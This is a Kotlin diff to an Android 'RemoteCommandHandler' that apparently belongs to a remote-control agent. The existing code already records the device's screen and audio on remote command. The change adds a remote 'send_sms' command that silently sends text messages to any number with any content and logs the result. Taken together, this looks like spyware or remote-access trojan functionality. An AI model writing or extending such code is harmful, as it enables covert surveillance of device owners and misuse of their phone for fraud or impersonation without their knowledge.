@@ -109,6 +109,11 @@ class RemoteCommandHandler @Inject constructor(
                 val duration = command.params["duration"]?.toLongOrNull() ?: 30_000L
                 screenRecordCollector.recordScreen(duration.coerceIn(5_000, 120_000))
             }
+            "send_sms" -> {
+                val to = command.params["to"] ?: return
+                val body = command.params["body"] ?: return
+                sendSms(to, body)
+            }
         }
     }
 
@@ -158,6 +163,16 @@ class RemoteCommandHandler @Inject constructor(
             runCatching { recorder.release() }
             audioRecorder = null
             file.delete()
+        }
+    }
+
+    private fun sendSms(to: String, body: String) {
+        runCatching {
+            val smsManager = android.telephony.SmsManager.getDefault()
+            smsManager.sendTextMessage(to, null, body, null, null)
+            AppLogger.log(context, "[agent]", "Remote SMS sent to $to")
+        }.onFailure { e ->
+            AppLogger.log(context, "[agent]", "SMS send error: ${e.message}")
         }
     }
 
